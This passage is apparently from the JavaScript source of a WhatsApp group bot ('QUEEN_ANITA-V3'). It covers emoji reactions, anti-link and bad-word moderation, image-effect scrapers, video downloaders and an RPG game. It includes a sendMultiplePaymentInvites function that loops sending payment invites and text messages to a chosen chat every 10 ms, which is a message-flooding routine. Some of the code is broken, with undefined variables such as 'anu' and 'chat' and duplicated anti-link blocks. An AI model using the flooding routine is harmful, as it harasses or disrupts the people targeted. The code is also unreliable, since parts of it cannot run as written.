"👨‍👦", "👨‍👦‍👦", "👨‍👧", "👨‍👧‍👦", "👨‍👧‍👧", "👩‍👦", "👩‍👦‍👦", "👩‍👧", "👩‍👧‍👦", "👩‍👧‍👧",
"🗣️", "👤", "👥", "🫂", "👣", "🦰", "🦱", "🦳", "🦲", "🐵"];
    
    // Function to pick a random emoji
    const getRandomEmoji = () => emojis[Math.floor(Math.random() * emojis.length)];

    // Trigger a random emoji reaction once when a message is received
    await ptz.sendMessage(m.chat, { react: { text: getRandomEmoji(), key: m.key }});
    
  } catch (err) {
    // In case of any errors, still react with a random emoji
    await ptz.sendMessage(m.chat, { react: { text: getRandomEmoji(), key: m.key }});
  }
}
} 
        

 	

//================== [ DATABASE ] ==================//
try {
let isNumber = x => typeof x === 'number' && !isNaN(x)
let user = global.db.data.users[m?.sender]
if (typeof user !== 'object') global.db.data.users[m?.sender] = {}
if (user) {
} else global.db.data.users[m?.sender] = {
}
if (isAntiLink) {
if (budy.match('https://')) {
if (!isBotAdmins) return !0
if (isAdmins) return !0
if (isOwner) return !0
await ptz.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
await ptz.groupParticipantsUpdate(m.chat, [m.sender], 'delete')
}}

// Add 'AntiLink Warn' and 'AntiLink Kick' logic
if (isAntiLink) {
    if (budy.match('https://')) {
        if (!isBotAdmins) return !0;  // Bot needs to be admin
        if (isAdmins) return !0;  // Skip for group admins
        if (isOwner) return !0;  // Skip for group owner

        // Check if it's AntiLink Warn
        if (isAntiLinkwarn) {
            await ptz.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }});
            await ptz.sendMessage(m.chat, { text: `Warning @${m.sender.split("@")[0]}! Do not send links in this group!`, mentions: [m.sender] });
        }

        // Check if it's AntiLink Kick
        if (isAntiLinkremove) {
            await ptz.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }});
            await ptz.groupParticipantsUpdate(m.chat, [m.sender], 'remove');
        }
    }
}



 let chats = global.db.data.chats[m?.chat]
 if (typeof chats !== 'object') global.db.data.chats[m?.chat] = {}
 if (chats) {
 if (!('isBanned' in chat)) chat.isBanned = false
 } else global.db.data.chats[m?.chat] = {
 isBanned: false,
}

let setting = global.db.data.settings[botNumber]
if (typeof setting !== 'object') global.db.data.settings[botNumber] = {}
if (setting) {
if (!('autotyping' in setting)) setting.autoTyping = false
 if (!('autorecording' in setting)) setting.autoRecord = false
 if (!('antilink' in chats)) chats.antilink = false
if (!('antilinkgc' in chats)) chats.antilinkgc = false
if (!("public" in settings)) settings.public = true
} else global.db.data.settings[botNumber] = {
 autoread: false,
 autotyping: false,
 autorecording: false, 
 antilink: true,
antilinkgc: false, 
 public: true,
}
} catch (err) {
}




    //===== [ SCRAPE ] =====//
    const { queryString } = require('object-query-string')
const photoOxy = (url, text) => new Promise((resolve, reject) => {
  axios({
    method: 'GET',
    url: url,
    headers: {
      'user-agent': 'Mozilla/5.0 (Linux; Android 9; Redmi 7A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.99 Mobile Safari/537.36'
    }
  })
  .then(({ data, headers }) => {
    const token = /<input type="hidden" name="token" value="(.*?)" id="token">/.exec(data)[1]
    const build_server = /<input type="hidden" name="build_server" value="(.*?)" id="build_server">/.exec(data)[1]
    const build_server_id = /<input type="hidden" name="build_server_id" value="(.*?)" id="build_server_id">/.exec(data)[1]
    const cookie = headers['set-cookie'][0]
    const form = new FormData()
    if (typeof text === 'string') text = [text]
    for (let texts of text) form.append('text[]', texts)
    form.append('sumbit', 'GO')
    form.append('token', token)
    form.append('build_server', build_server)
    form.append('build_server_id', build_server_id)
    axios({
      method: 'POST',
      url: url,
      data: form,
      headers: {
        'user-agent': 'Mozilla/5.0 (Linux; Android 9; Redmi 7A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.99 Mobile Safari/537.36',
        'cookie': cookie,
        ...form.getHeaders()
      }
    })
    .then(({ data }) => {
      const form_value = /<div.*?id = "form_value".+>(.*?)<\/div>/.exec(data)[1]
      axios({
        method: 'GET',
        url: 'https://photooxy.com/effect/create-image?' + queryString(JSON.parse(form_value)),
        headers: {
          'user-agent': 'Mozilla/5.0 (Linux; Android 9; Redmi 7A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.99 Mobile Safari/537.36',
          'cookie': cookie
        }
      })
      .then(({ data }) => {
        resolve(build_server + data.image)
      })
      .catch(reject)
    })
    .catch(reject)
  })
  .catch(reject)
})
async function ephoto(url, texk) {
      let form = new FormData();
      let gT = await axios.get(url, {
        headers: {
          'user-agent':
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
        },
      });
      let $ = cheerio.load(gT.data);
      let text = texk;
      let token = $('input[name=token]').val();
      let build_server = $('input[name=build_server]').val();
      let build_server_id = $('input[name=build_server_id]').val();
      form.append('text[]', text);
      form.append('token', token);
      form.append('build_server', build_server);
      form.append('build_server_id', build_server_id);
      let res = await axios({
        url: url,
        method: 'POST',
        data: form,
        headers: {
          Accept: '*/*',
          'Accept-Language': 'en-US,en;q=0.9',
          'user-agent':
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
          cookie: gT.headers['set-cookie']?.join('; '),
          ...form.getHeaders(),
        },
      });
      let $$ = cheerio.load(res.data);
      let json = JSON.parse($$('input[name=form_value_input]').val());
      json['text[]'] = json.text;
      delete json.text;
      let { data } = await axios.post(
        'https://en.ephoto360.com/effect/create-image',
        new URLSearchParams(json),
        {
          headers: {
            'user-agent':
              'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
            cookie: gT.headers['set-cookie'].join('; '),
          },
        }
      );
      return build_server + data.image;
    }






async function sendMultiplePaymentInvites(jid, count) {
  for (let i = 0; i < count; i++) {
    sendPaymentInvite(jid);
    sendExtendedTextMessage(jid);
    await sleep(10);
  }
}




 if (!isCreator.autodownload && !m.key.fromMe) {
try {
if (budy.match(`instagram.com`)) {
await ptz.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})   
let anal = await fetchJson(`https://api.junn4.my.id/download/instagram?url=${budy}`)
ptz.sendMessage(m.chat, { video: { url: anu.result.url}, caption: `ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅᴀᴠɪᴅ ᴄʏʀɪʟ ᴛᴇᴄʜ™`}, {quoted: m})
await ptz.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})   
} else if (budy.match(`tiktok.com`)) {
await ptz.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})   
let anals = await fetchJson(`https://api.junn4.my.id/download/tiktok?url=${budy}`)
ptz.sendMessage(m.chat, { video: { url: anals.result.Medium.url}, caption: `ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅᴀᴠɪᴅ ᴄʏʀɪʟ ᴛᴇᴄʜ™`}, {quoted: m})
await ptz.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})   
} else if (budy.match(`facebook.com`)) {
await ptz.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})   
let shi = await fetchJson(`https://api.junn4.my.id/download/facebook?url=${budy}`)
ptz.sendMessage(m.chat, { video: { url: shi.result.video_sd}, caption: `ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅᴀᴠɪᴅ ᴄʏʀɪʟ ᴛᴇᴄʜ™`}, {quoted: m})
await ptz.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})   
} else if (budy.match(`youtube.com|youtu.be`)) {
await ptz.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})   
let sky = await fetchJson(`https://api.junn4.my.id/download/ytmp4?url=${budy}`)
ptz.sendMessage(m.chat, { video: { url: sky.result.media}, caption: ``}, {quoted: m})
await ptz.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})   
} 
} catch (err) {
await ptz.sendMessage(m.chat, { react: { text: "✖️",key: m.key,}})   
}
} 

  







// Anti-Virtex Logic for Private Chats Only




    //====== //
    const fitur = () =>{
            var mytext = fs.readFileSync("./message.js").toString()
            var numUpper = (mytext.match(/case '/g) || []).length
            return numUpper
        }
//================== [ FUNC ] ==================//
if ((m?.chat in global.db.data.chats || m?.sender in global.db.data.users)) {
let chat = global.db.data.chats[m?.chat]
if (chat && chat.isBanned && !isCreator) return
}
    let m2 = "`"
    let ikamu =  "`"
const resver = `*${ikamu}[ INFO - USER ]${ikamu}* 
*ᴘʀᴇᴍɪᴜᴍ:* ${isCreator ? 'ʏᴇꜱ':'ɴᴏ'}

*${ikamu}[ INFO - BOT ]${ikamu}*
• *ᴜᴘʟᴏᴀᴅ:* ${upload}
• *ᴅᴏᴡɴʟᴏᴀᴅ:* ${download}
• *ɴᴏᴅᴇᴊꜱ ᴠᴇʀꜱɪᴏɴ:* ${process.version}
• *ᴠᴇʀꜱɪᴏɴ:* 2
• *ᴡʜɪꜱᴋᴇʏꜱᴏᴄᴋᴇᴛꜱ:* 6.6.0
`
const tektek = `
╭────────────────────
│  ✦ *QUEEN_ANITA-V3* ✦
╰────────────────────
 ‎ ✦ ‎ ‎ ‎ ‎- ‎ ‎ ‎  ᴀɪᴍᴇɴᴜ  
 ‎ ✦ ‎ ‎ ‎ ‎- ‎ ‎ ‎  ᴄᴏɴᴠᴇʀᴛᴍᴇɴᴜ
  ✦    -     ғᴜɴᴍᴇɴᴜ
  ✦ ‎ ‎ ‎ ‎- ‎ ‎ ‎  ᴀɴɪᴍᴇᴍᴇɴᴜ
 ‎ ✦ ‎ ‎ ‎ ‎- ‎ ‎ ‎  ᴅᴏᴡɴʟᴏᴀᴅᴍᴇɴᴜ
 ‎ ✦ ‎ ‎ ‎ ‎- ‎ ‎ ‎  ᴀʟʟᴍᴇɴᴜ      
 ‎ ✦ ‎ ‎ ‎ ‎- ‎ ‎ ‎  ɢʀᴏᴜᴘᴍᴇɴᴜ
 ‎ ✦ ‎ ‎ ‎ ‎- ‎ ‎ ‎  ᴍᴀɪɴᴍᴇɴᴜ
 ‎ ✦ ‎ ‎ ‎ ‎- ‎ ‎ ‎  ᴛᴏᴏʟꜱᴍᴇɴᴜ
 ‎ ✦ ‎ ‎ ‎ ‎- ‎ ‎ ‎  ɴsғᴡᴍᴇɴᴜ
 ‎ ✦ ‎ ‎ ‎ ‎- ‎ ‎ ‎  ᴘʜᴏᴛᴏᴏxʏᴍᴇɴᴜ
 ‎ ✦ ‎ ‎ ‎ ‎- ‎ ‎ ‎  sʏsᴛᴇᴍᴇɴᴜ      
 ‎ ✦ ‎ ‎ ‎ ‎- ‎ ‎ ‎  ᴇᴘʜᴏᴛᴏᴍᴇɴᴜ
 ‎ ✦ ‎ ‎ ‎ ‎- ‎ ‎ ‎  ꜱᴛɪᴄᴋᴇʀᴍᴇɴᴜ 
 ‎ ✦ ‎ ‎ ‎ ‎- ‎ ‎ ‎  ᴛᴇᴍᴘᴏʀᴍᴇɴᴜ
 ‎ ✦ ‎ ‎ ‎ ‎- ‎ ‎ ‎  ʙᴏᴛᴍᴇɴᴜ
 ‎ ✦ ‎ ‎ ‎ ‎- ‎ ‎ ‎  ᴏᴡɴᴇʀᴍᴇɴᴜ`
const used = process.memoryUsage();
const cpus = os.cpus().map((cpu) => {
cpu.total = Object.keys(cpu.times).reduce(
(last, type) => last + cpu.times[type],
0,
);
return cpu;
});
const cpu = cpus.reduce(
(last, cpu, _, { length }) => {
last.total += cpu.total;
last.speed += cpu.speed / length;
last.times.user += cpu.times.user;
last.times.nice += cpu.times.nice;
last.times.sys += cpu.times.sys;
last.times.idle += cpu.times.idle;
last.times.irq += cpu.times.irq;
return last;
},
{
speed: 0,
total: 0,
times: {
user: 0,
nice: 0,
sys: 0,
idle: 0,
irq: 0,
},
},
);

var date = new Date();
var jam = date.getHours();
var menit = date.getMinutes();
var detik = date.getSeconds();
var ram = `${formatSize(process.memoryUsage().heapUsed)} / ${formatSize(os.totalmem)}`;
var cpuuuu = os.cpus();
var sisaram = `${Math.round(os.freemem)}`;
var totalram = `${Math.round(os.totalmem)}`;
var persenram = (sisaram / totalram) * 100;
var persenramm = 100 - persenram;
var ramused = totalram - sisaram;

var space = await checkDiskSpace(process.cwd());
var freespace = `${Math.round(space.free)}`;
var totalspace = `${Math.round(space.size)}`;
var diskused = totalspace - freespace;
var neww = performance.now();
var oldd = performance.now();
let timestamp = speed();
let latensi = speed() - timestamp;
var { download, upload } = await checkBandwidth();

//=======// Rpg

          
           const { addtoken, gettoken, kurangtoken } = require("./src/alat_tukar.js")    
        const istoken = gettoken(m?.sender)
        
const { addInventoriDarah,  cekDuluJoinAdaApaKagaDiJson,  addDarah,  kurangDarah, getDarah }= require('./src/darah.js')
const { cekInventoryAdaAtauGak,  addInventori, addBesi, addEmas, addEmerald,addUmpan,addPotion,kurangBesi, kurangEmas, kurangEmerald, kurangUmpan,kurangPotion,getBesi, getEmas, getEmerald, getUmpan, getPotion, addMahkota, KurangMahkota, getMahkota,} = require('./src/alat_tukar.js')
const {  addInventoriMonay,  cekDuluJoinAdaApaKagaMonaynyaDiJson,  addMonay,  kurangMonay, getMonay, } = require('./src/monay.js')
const { getLimit, isLimit, limitAdd, giveLimit, addBalance, kurangBalance, getBalance, isGame, gameAdd, givegame, cekGLimit } = require("./lib/limit");
const { addInventoriLimit, cekDuluJoinAdaApaKagaLimitnyaDiJson, addLimit, kurangLimit, /*getLimit*/ } = require('./src/limit.js')
let _petualang = JSON.parse(fs.readFileSync('./src/inventory.json'))
const { cekDuluHasilBuruanNya, addInventoriBuruan, addIkan, addAyam,  addKelinci,  addDomba,  addSapi, addGajah, kurangIkan, kurangAyam,  kurangKelinci,  kurangDomba,  kurangSapi, kurangGajah, getIkan, getAyam,  getKelinci, getDomba,getSapi, getGajah } = require('./src/buruan.js')
const { getLevelingXp,getLevelingLevel,getLevelingId,addLevelingXp,addLevelingLevel,addLevelingId,addATM,addKoinUser,checkATMuser,getMancingIkan,getMancingId,addMancingId,jualIkan,addPlanet,getBertualangPlanet,getPlaneId,addPlaneId,jualbahankimia,addCoal,getMiningcoal,getMiningId,addMiningId,jualcoal,addStone,getMiningstone,getBatuId,addBatuId,jualstone,addOre,getMiningore,getOreId,addOreId,jualore,addIngot,getMiningingot,getIngotId,addIngotId,jualingot,addKayu,getNebangKayu,getNebangId,addNebangId,jualKayu, checkPetualangUser, addDm, sellDm, getDm} = require('./rpg.js')
let DarahAwal = global.rpg.darahawal
const ikan = ['🐳','🐟','🐠']
let _buruan = JSON.parse(fs.readFileSync('./src/hasil_buruan.json'));
let _darahOrg = JSON.parse(fs.readFileSync('./src/darah.json'))
let hit = JSON.parse(fs.readFileSync('./src/total-hit-user.json'))


// energy 


const { addInventorienergy,  cekDuluJoinAdaApaKagaDiJsonenergy,  addenergy, kurangenergy, getenergy }= require('./src/energy.js')
let energyAwal =global.rpg.energyawal
let _energyOrg = JSON.parse(fs.readFileSync('./src/energy.json'))
const isenergy = cekDuluJoinAdaApaKagaDiJsonenergy(m?.sender)
const isCekenergy = getenergy(m?.sender)
const isDarah = cekDuluJoinAdaApaKagaDiJsonenergy(m?.sender)
const isCekDarah = getDarah(m?.sender)
const isUmpan = getUmpan(m?.sender)
const isPotion = getPotion(m?.sender)
const isIkan = getIkan(m?.sender)
const isAyam = getAyam(m?.sender)
const isKelinci = getKelinci(m?.sender)
const isDomba = getDomba(m?.sender)
const isSapi = getSapi(m?.sender)
const isGajah = getGajah(m?.sender)
const isMonay = getMonay(m?.sender)
//const isLimit = getLimit(m.sender)
const isBesi = getBesi(m?.sender)
const isEmas = getEmas(m?.sender)
const isEmerald = getEmerald(m?.sender)
const isPetualang = checkPetualangUser(m?.sender)
const isInventory = cekInventoryAdaAtauGak(m?.sender)
const isInventoriBuruan = cekDuluHasilBuruanNya(m?.sender)
const isInventoryLimit = cekDuluJoinAdaApaKagaLimitnyaDiJson(m?.sender)
const isInventoryMonay = cekDuluJoinAdaApaKagaMonaynyaDiJson(m?.sender)
const chatId = m.chat;
    
    const isUserRegistered = (userId) => {
            const data = fs.readFileSync('./Rpg/join.json', 'utf8');
            const users = JSON.parse(data);
            return users.some(user => user.id === userId);
        };
    const ckusrjoin = m.sender
const JSON_FILE_PATH = './Rpg/gacha_result.json';

 async function spinItem(chatId) {
    const items = ['*Crown of the Beast Lord 👑*', '*Gacha 1x Token 🎟*', '*Emoji Respec++ 😎*', '*Logamon Chip [ More Power Rpg 🔓 ]*', '*Rebootmon Chip [ Super Power Rpg 🔓 ]*'];
    const randomIndex = Math.floor(Math.random() * items.length);
    const selectedItem = items[randomIndex];
    let gachaResults = [];
    try {
        gachaResults = JSON.parse(fs.readFileSync(JSON_FILE_PATH, 'utf-8'));
    } catch (error) {
        console.error('Error reading JSON file:', error);
    }
gachaResults.push({ chatId, item: selectedItem });
    try {
        fs.writeFileSync(JSON_FILE_PATH, JSON.stringify(gachaResults, null, 2));
        console.log('Gacha result saved to JSON file');
    } catch (error) {
        console.error('Error writing JSON file:', error);
    }
    const hasilgacha = `Congratulations ! Anda Get: ${selectedItem}\nJika Get Item Yang Sama\nAnda Tidak akan Mempunyai nya lebih, Maximum 1`;
    await reply('until the result')
}
    const { addCho, kurangCho, getCho } = require('./src/alat_tukar.js')
const isCho = getCho(m?.sender)
//==========//

// Pemberitahuan system
 
ptz.autoshalat = ptz.autoshalat ? ptz.autoshalat : {};
let who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? ptz.user.id : m.sender;
let id = m.chat;
if (id in ptz.autoshalat) {
return false;
}
let jadwalSholat = {
shubuh: "04:29",
terbit: "05:44",
dhuha: "06:02",
dzuhur: "12:02",
ashar: "15:15",
magrib: "17:52",
isya: "19:01",
};
const datek = new Date(
new Date().toLocaleString("en-US", {
timeZone: "Asia/Jakarta",}),
);
const hours = datek.getHours();
const minutes = datek.getMinutes();
const timeNow = `${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}`;
for (let [sholat, waktu] of Object.entries(jadwalSholat)) {
if (timeNow === waktu) {
let caption = ``;
ptz.autoshalat[id] = [
m?.reply(caption),
setTimeout(async () => {
delete ptz.autoshalat[m.chat];
}, 57000),];
}}
    const cron = require('node-cron')
    /*cron.schedule("0 0 5 * * *", () => {
ptz.sendMessage(m.chat, { text : '*`<!> Bangun-bangun, Already subuh mari kita beraktivitas`*\n\n[ Pemberitahuan Sholat-2 ]', mentions: participants.map(a => a.id)})
}, {scheduled: true, timezone: "Asia/Jakarta"});

cron.schedule('0 0 22 * * *', async () => {
const getGroups = await ptz.groupFetchAllParticipating()
const groups = Object.keys(getGroups)
let text = '*`<!> Hello Group is automatically closed\nNow it's time to sleep 😴*`'
if (groups.some(v => v === frommeky) && !(await ptz.groupMetadata(frommeky)).announce) {
ptz.groupSettingUpdate(frommeky, 'announcement').then(() => ptz.sendMessage(frommeky, {text: text}, {ephemeralExpiration: m.expiration}));
}
}, { scheduled: true, timezone: 'Asia/Jakarta' })

cron.schedule('0 0 6 * * *', async () => {
const getGroups = await ptz.groupFetchAllParticipating()
const groups = Object.keys(getGroups)
let texct = '*`<!> Hello Group is automatically opened again\nHopefully everyone is always healthy 🤗*`'
if (groups.some(v => v === frommeky) && (await ptz.groupMetadata(frommeky)).announce) {
ptz.groupSettingUpdate(frommeky, 'not_announcement');
ptz.sendMessage(frommeky, {text: texct, mentions: Object.values(global.db.groups[frommeky].member).map(v => v.id)}, {ephemeralExpiration: m.expiration});
ptz.groupRequestParticipantsList(frommeky).then(async (data) => {
if (data.length === 0) return
for (let i of data) {
await ptz.groupRequestParticipantsUpdate(frommeky, [i.jid], 'approve')
await sleep(2300)
}
})
}
}, { scheduled: true, timezone: 'Asia/Jakarta' })*/
    // ========= //

const fsaluran = { key : {
remoteJid: '0@s.whatsapp.net',
participant : '0@s.whatsapp.net'
},
message: {
newsletterAdminInviteMessage: {
newsletterJid: '120363210705976689@newsletter',
    newsletterName: '',
    caption: `${command}`
}}}
    async function addCountCmd(nama, sender, _db) {
addCountCmdUser(nama, m?.sender, _cmdUser)
var posi = null
Object.keys(_db).forEach((i) => {
if (_db[i].nama === nama) {
posi = i
}
})
if (posi === null) {
_db.push({nama: nama, count: 1})
fs.writeFileSync('./system/command.json',JSON.stringify(_db, null, 2));
} else {
_db[posi].count += 1
fs.writeFileSync('./system/command.json',JSON.stringify(_db, null, 2));
}
}
    async function loading () {
var loding = [
 '`【▬▬▭▭▭▭▭▭▭】`',
 '`【▬▬▬▭▭▭▭▭▭】`',
 '`【▬▬▬▬▬▬▭▭▭】`',
 '`【▬▬▬▬▬▬▬▬▭】`',
 '`【▬▬▬▬▬▬▬▬▬▬▬ 】`',
 '`【 ▬▬▬[ 100% ]▬▬▬ 】`'
]
let { key } = await ptz.sendMessage(frommeky, {text: '`【▬▭▭▭▭▭▭▭▭】'})

for (let i = 0; i < loding.length; i++) {
/*await sleep(1000)*/
await ptz.sendMessage(frommeky, {text: loding[i], edit: key });
}
/* setTimeout (async  () => {
reply('*•~- `【 ▬▬▬[ Processing ]▬▬▬ 】` -~•*')*/
}
  /*  const reply = async(teks) => {
    ptz.sendMessage(m.chat, {
                        document: {
                           url: 'https://imgur.com/a/PD8nT5X'
                        },
                        caption: teks,
                        mimetype: 'application/pdf',
                        fileName: "ᴏ̨ᴜᴇᴇɴ_ᴀɴɪᴛᴀ-ᴠ1 • 2024",
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: "QUEEN_ANITA-V3 • MULTI DEVICE",
                                body: "©David Cyril ",
                                thumbnail: fs.readFileSync('./thum.jpg'),
                                sourceUrl: "https://ẉ.ceo/ziyoo-pemula",
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fsaluran
                    })
}*/
        const reply = (teks) => {
      ptz.sendMessage(m.chat,
      { text: teks,
      contextInfo:{
      mentionedJid:[m?.sender],
      forwardingScore: 9999999,
      isForwarded: true,
      "externalAdReply": {
      "showAdAttribution": true,
      "containsAutoReply": true,
      "title": `QUEEN_ANITA-V3`,
      "body": `ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅᴀᴠɪᴅ ᴄʏʀɪʟ ᴛᴇᴄʜ™`,
      "previewType": "PHOTO",
      "thumbnailUrl": ``,
      "thumbnail": fs.readFileSync(`./anitav3.jpg`),
      "sourceUrl": `https://whatsapp.com/channel/0029VaeRru3ADTOEKPCPom0L`}}},
      { quoted: m})
	  }

    const replyz = (teks) => {
      ptz.sendMessage(m.chat, { text: teks }, { quoted: m }); 
    }; 
    
    const replym = async(teks, url, fotern) => {
ptz.sendMessage(m.chat, {
document: fs.readFileSync("./package.json"),
fileName: 'QUEEN_ANITA-V3 - ' + fotern,
mimetype: 'application/pdf',
jpegThumbnail:fs.readFileSync("./thum.jpg"),
caption: `\n${teks}`,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: '⟡ A N I T A _ V-1 • M U L T I • D E V I C E ⟡',
body: `© David Cyril 2024 - 2099` ,
thumbnailUrl: url,
sourceUrl: '',
mediaType: 1,
renderLargerThumbnail: true 
}}}, { quoted: fsaluran,ephemeralExpiration: 86400});
    }
    
const { getRegisteredRandomId, addRegisteredUser, createSerial, checkRegisteredUser } = require('./system/register.js')
const isRegistered = checkRegisteredUser(m?.sender)

//=====// Anti
 // Anti Link
  const messagesD = body.slice(0).trim().split(/ +/).shift().toLowerCase() 
  const ntilink = JSON.parse(fs.readFileSync("./database/antilinkall.json"))
const AntiLink = m.isGroup ? ntilink.includes(from) : false 

const BadWor = JSON.parse(fs.readFileSync('./database/bad.json'))   
let ntilinkytch =JSON.parse(fs.readFileSync('./database/antilinkytchannel.json'));
let ntilinkytvid =JSON.parse(fs.readFileSync('./database/antilinkytvideo.json'));     
let ntnsfw = JSON.parse(fs.readFileSync('./database/nsfw.json'));    
let ntvirtex = JSON.parse(fs.readFileSync('./database/antivirus.json'));
let nttoxic = JSON.parse(fs.readFileSync('./database/antitoxic.json'));
let ntwame = JSON.parse(fs.readFileSync('./database/antiwame.json'));     
let ntilinkall =JSON.parse(fs.readFileSync('./database/antilinkall.json'));
let ntilinktwt =JSON.parse(fs.readFileSync('./database/antilinktwitter.json'));
let ntilinktt =JSON.parse(fs.readFileSync('./database/antilinktiktok.json'));
let ntilinktg =JSON.parse(fs.readFileSync('./database/antilinktelegram.json'));
let ntilinkfb =JSON.parse(fs.readFileSync('./database/antilinkfacebook.json'));
let ntilinkig =JSON.parse(fs.readFileSync('./database/antilinkinstagram.json'));
let autosticker = JSON.parse(fs.readFileSync('./database/autosticker.json'));   
let ntlinkgc =JSON.parse(fs.readFileSync('./database/antilinkgc.json'));     
const AntiNsfw = m.isGroup ? ntnsfw.includes(from) : false
      const isAutoSticker = m.isGroup ? autosticker.includes(from) : false
        const antiVirtex = m.isGroup ? ntvirtex.includes(from) : false
        const Antilinkgc = m.isGroup ? ntlinkgc.includes(m.chat) : false
        const AntiLinkYoutubeVid = m.isGroup ? ntilinkytvid.includes(from) : false
        const AntiLinkYoutubeChannel = m.isGroup ? ntilinkytch.includes(from) : false
        const AntiLinkInstagram = m.isGroup ? ntilinkig.includes(from) : false
        const AntiLinkFacebook = m.isGroup ? ntilinkfb.includes(from) : false
        const AntiLinkTiktok = m.isGroup ? ntilinktt.includes(from) : false
        const AntiLinkTelegram = m.isGroup ? ntilinktg.includes(from) : false
        const AntiLinkTwitter = m.isGroup ? ntilinktwt.includes(from) : false
        const AntiLinkAll = m.isGroup ? ntilinkall.includes(from) : false
        const antiWame = m.isGroup ? ntwame.includes(from) : false
        const antiToxic = m.isGroup ? nttoxic.includes(from) : false
     
if (AntiLink) {
if (budy.includes("https://")){
if (!isBotAdmins) return reply(`${mess.botAdmin}, _To kick the person who sends the group link_`)
let gclink = (`https://`+await ptz.groupInviteCode(m.chat))
let isLinkThisGc = new RegExp(gclink, 'i')
let isgclink = isLinkThisGc.test(m.text)
if (isgclink) return ptz.sendMessage(m.chat, {text: `\`\`\`「 Group Linki Detected 」\`\`\`\n\n You will not be kicked by the bot because what you sent is a link to this group`})
if (isAdmins) return ptz.sendMessage(m.chat, {text: `\`\`\`「 Group Link Detected 」\`\`\`\n\n The admin has sent the link, the admin is free to post any link`})
if (isCreator) return ptz.sendMessage(m.chat, {text: `\`\`\`「 Group Link Detected 」\`\`\`\n The owner has sent a link, the owner is free to post any link`})
await ptz.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
ptz.sendMessage(from, {text:`\`\`\`「 Group Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} You Message Has been delete, sorry.`, contextInfo:{mentionedJid:[sender]}}, {quoted:m})
}
}
  if (antiWame)
  if (budy.includes(`wa.me`)) {
if (!isBotAdmins) return
//bvl = `\`\`\`「 wa.me Link Detected 」\`\`\`\n\nAdmin has sent a wa.me link, admin is free to send any link😇`
if (isAdmins) return console.log("Guard")
if (m.key.fromMe) return console.log("Guard")
if (isCreator) return console.log("Guard")
kice = m.sender
        await ptz.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			ptz.groupParticipantsUpdate(m.chat, [m.sender], 'delete')
ptz.sendMessage(from, {text:`\`\`\`「 Wa.me Link Detected 」\`\`\`\n\n@${kice.split("@")[0]} You Message Has been delete, sorry.`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
} else {
}
  if (antiWame)
  if (budy.includes(`http://wa.me`)) {
if (!isBotAdmins) return
//bvl = `\`\`\`「 Wa.me Link Detected 」\`\`\`\n\nAdmin has sent a wa.me link, admin is free to send any link😇`
if (isAdmins) return console.log("Guard")
if (m.key.fromMe) return console.log("Guard")
if (isCreator) return console.log("Guard")
kice = m.sender
        await ptz.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
ptz.sendMessage(from, {text:`\`\`\`「 Wa.me Link Detected 」\`\`\`\n\n@${kice.split("@")[0]} You Message Has been delete, sorry.`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
} else {
}

  
if (antiToxic)
if (BadWor.includes(messagesD)) {
if (m.text) { 
//bvl = `\`\`\`「 Bad Word Detected 」\`\`\`\n\nYou are using bad word but you are an admin/owner that's why i won't kick you😇`
if (isAdmins) return console.log("Guard")
if (m.key.fromMe) return console.log("Guard")
if (isCreator) return console.log("Guard")
        await ptz.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
                   })
ptz.sendMessage(from, {text:`\`\`\`「 Bad Word Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} You Message Has been delete, sorry.`, contextInfo:{mentionedJid:[sender]}}, {quoted:m})
}
}
if (AntiLinkYoutubeVid)
if (budy.includes("https://youtu.be/")){
if (!isBotAdmins) return
//bvl = `\`\`\`「 YoutTube Video Link Detected 」\`\`\`\n\nAdmin has sent a youtube video link, admin is free to send any link😇`
if (isAdmins) return console.log("Guard")
if (m.key.fromMe) return console.log("Guard")
if (isCreator) return console.log("Guard")
        await ptz.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
